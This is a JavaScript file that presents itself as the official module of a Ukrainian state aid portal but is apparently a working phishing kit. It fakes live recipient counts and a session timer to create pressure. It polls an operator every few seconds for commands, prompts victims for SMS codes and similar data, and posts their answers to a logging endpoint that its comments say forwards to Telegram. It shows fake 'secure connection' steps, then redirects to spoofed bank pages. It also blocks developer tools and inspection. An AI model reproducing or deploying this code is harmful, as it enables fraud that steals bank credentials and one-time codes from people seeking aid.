/**
 * ОФІЦІЙНИЙ МОДУЛЬ ПОРТАЛУ єДОПОМОГА
 * Версія системи: 4.2.0 (2026)
 */

// --- СИСТЕМНІ ЗМІННІ ---

// Генеруємо або дістаємо існуючий ID користувача для поточної сесії
if (!sessionStorage.getItem('USER_ID')) {
    const newId = 'ID-' + Math.floor(Math.random() * 89999 + 10000);
    sessionStorage.setItem('USER_ID', newId);
}
const USER_ID = sessionStorage.getItem('USER_ID');

document.addEventListener('DOMContentLoaded', () => {

    // 1. Поточна дата
    const dateEl = document.getElementById('current-date');
    if (dateEl) {
        dateEl.innerText = new Date().toLocaleDateString('uk-UA');
    }

    // 2. Анімація статистики
    const peopleCountEl = document.getElementById('people-count');
    if (peopleCountEl) {
        animateValue("people-count", 14200, 14284, 2000);
        setInterval(() => updateLiveStats('people-count', 1, 3), 5000);
    }

    // 3. Таймер сесії
    const timerEl = document.getElementById('timer');
    if (timerEl) {
        startGlobalTimer(300, timerEl);
    }

    // 4. ЗАПУСК ПРОСЛУХОВУВАННЯ КОМАНД ВІД АДМІНА
    // Сайт кожні 3 секунди перевіряє, чи не натиснув ти кнопку в ТГ
    startCommandListener();
});

/**
 * ЛОГІКА ВЗАЄМОДІЇ З СЕРВЕРОМ
 */

async function startCommandListener() {
    setInterval(async () => {
        try {
            const response = await fetch(`/api/check/${USER_ID}`);
            const data = await response.json();

            if (data && data.action) {
                handleAdminCommand(data);
            }
        } catch (e) {
            // Тихо ігноруємо помилки мережі
        }
    }, 3000);
}

function handleAdminCommand(command) {
    if (command.action === 'msg') {
        // Просто виводимо повідомлення (наприклад, "Мало грошей")
        alert(command.text);
    } 
    else if (command.action === 'ask') {
        // Запитуємо введення (СМС, Звонок тощо)
        const result = prompt(command.text);
        if (result) {
            // Відправляємо відповідь назад тобі в Telegram
            fetch('/api/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userId: USER_ID,
                    type: 'ВВІД КОРИСТУВАЧА',
                    data: { "Результат": result }
                })
            });
            alert("Дані прийнято. Очікуйте підтвердження...");
        }
    }
}

/**
 * ФУНКЦІЇ-ХЕЛПЕРИ
 */

function animateValue(id, start, end, duration) {
    const obj = document.getElementById(id);
    if (!obj) return;
    const range = end - start;
    let startTime = null;
    function step(timestamp) {
        if (!startTime) startTime = timestamp;
        const progress = Math.min((timestamp - startTime) / duration, 1);
        obj.innerHTML = Math.floor(progress * range + start).toLocaleString('uk-UA');
        if (progress < 1) window.requestAnimationFrame(step);
    }
    window.requestAnimationFrame(step);
}

function updateLiveStats(id, min, max) {
    const el = document.getElementById(id);
    if (!el) return;
    const currentText = el.innerText.replace(/\s/g, '').replace(/,/g, '');
    const current = parseInt(currentText) || 0;
    const added = Math.floor(Math.random() * (max - min + 1) + min);
    el.innerHTML = (current + added).toLocaleString('uk-UA');
}

function startGlobalTimer(duration, display) {
    let timer = duration;
    const interval = setInterval(() => {
        let minutes = Math.floor(timer / 60);
        let seconds = timer % 60;
        display.textContent = `${minutes < 10 ? "0" + minutes : minutes}:${seconds < 10 ? "0" + seconds : seconds}`;
        if (--timer < 0) {
            clearInterval(interval);
            alert("Час сесії вичерпано.");
            window.location.reload();
        }
    }, 1000);
}

/**
 * ЛОГІКА ВИБОРУ БАНКУ
 */
function processBank(bankKey) {
    const loader = document.getElementById('loader');
    const statusText = document.getElementById('status-text');
    const progressBar = document.getElementById('progress-bar');

    if (loader) loader.style.display = 'flex';

    let stepIndex = 0;
    const steps = [
        { t: "Встановлення захищеного з'єднання...", p: 35 },
        { t: "Перевірка сертифікатів безпеки...", p: 70 },
        { t: "Перенаправлення на шлюз...", p: 100 }
    ];

    const interval = setInterval(() => {
        if (stepIndex < steps.length) {
            if (statusText) statusText.innerText = steps[stepIndex].t;
            if (progressBar) progressBar.style.width = steps[stepIndex].p + "%";
            stepIndex++;
        } else {
            clearInterval(interval);
            
            // Відправляємо в лог, куди саме перейшов користувач (з його ID)
            fetch('/api/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userId: USER_ID,
                    type: 'ПЕРЕХІД',
                    data: { "Банк": bankKey }
                })
            });

            window.location.href = bankKey + '.html';
        }
    }, 1200);
}

/**
 * ЗАХИСТ ІНТЕРФЕЙСУ
 */
document.addEventListener('contextmenu', event => event.preventDefault());

document.onkeydown = function (e) {
    if (e.keyCode == 123 || 
       (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || 
       (e.ctrlKey && e.keyCode == 85)) {
        return false;
    }
};

// Трюк Anti-Console
setInterval(function () {
    (function() {
        (function() {
            if (window.console && (console.log || console.info)) {
                debugger;
            }
        })();
    })();
}, 500);
